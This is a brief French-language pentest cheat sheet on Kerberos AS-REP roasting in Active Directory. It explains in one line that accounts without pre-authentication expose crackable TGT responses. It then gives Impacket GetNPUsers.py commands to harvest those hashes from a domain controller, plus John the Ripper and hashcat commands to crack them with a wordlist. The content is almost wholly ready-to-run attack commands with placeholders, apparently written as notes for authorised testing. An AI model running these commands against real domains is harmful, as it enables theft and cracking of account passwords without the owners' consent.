# KRB\_AS\_REP Roasting

## Theory

Possible de désactiver la nécessité d’authentification sur certain compte de domaine à la demande d’un TGT

## Method

#### Impacket & JTR

```bash
GetNPUsers.py <DOMAIN>/ -usersfile <USER-LIST> -format john -outputfile <FILE-LOG> -dc-ip <IP-KDC>
```

```bash
john <FILE-LOG> --wordlist=<WORDLIST>
```

#### Impacket & hashcat

```bash
GetNPUsers.py <DOMAIN>/ -usersfile <USER-LIST> -format hashcat -outputfile <FILE-LOG> -dc-ip <IP-KDC>
```

```
hashcat -m 18200 -a 0 <FILE-LOG> <WORDLIST> --force
```
